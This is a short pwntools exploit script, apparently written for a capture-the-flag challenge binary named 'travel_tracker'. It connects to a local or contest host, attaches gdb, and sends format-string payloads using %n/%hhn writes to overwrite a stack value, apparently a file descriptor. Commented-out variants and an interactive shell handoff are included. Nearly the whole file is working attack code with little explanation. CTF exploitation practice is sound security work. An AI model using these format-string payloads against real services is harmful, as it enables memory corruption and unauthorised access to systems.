#!/usr/bin/env python
from pwn import *
import psutil

BINARY = "travel_tracker"

context.update(arch="amd64",os="linux")
context.binary = exe = ELF(f"./{BINARY}", checksec=False)

def get_pid_by_name(process_name):
    for process in psutil.process_iter(attrs=['pid', 'name']):
        if process.info['name'] == process_name:
            return process.info['pid']
    return None

p = remote("localhost", 1024)
pause() # to give it some time before gdb attach

# p = remote("flu.xxx", 10060)

# attach to process in docker
gdb.attach(target=get_pid_by_name(BINARY), exe=f"./{BINARY}", gdbscript='''
    source /home/moody/.gdbinit-gef-docker.py
    b *writeToFile+73
    c
''')

wish2 = 0x22
wish9 = 0x19

# p.sendline(b"1") # endrer fd på stack
# p.recvuntil(b"code:")
# p.sendline(f"%{str(wish2)}x%2$hn")
# p.recvuntil(b"1-10):")
# p.sendline(b"1")
# p.recvuntil(b"comment:")
# p.sendline(b"BBBB")

p.sendline(b"1")
p.recvuntil(b"code:")
p.sendline(f"%{str(wish9)}x%9$hhn")
p.recvuntil(b"1-10):")
p.sendline(b"1")
p.recvuntil(b"comment:")
p.sendline(b"HHHH")

# normal:
# p.sendline(b"1")
# p.recvuntil(b"code:")
# p.sendline(f"AAAA")
# p.recvuntil(b"1-10):")
# p.sendline(b"1")
# p.recvuntil(b"comment:")
# p.sendline(b"HHHH")

p.sendline(b"3")

p.interactive()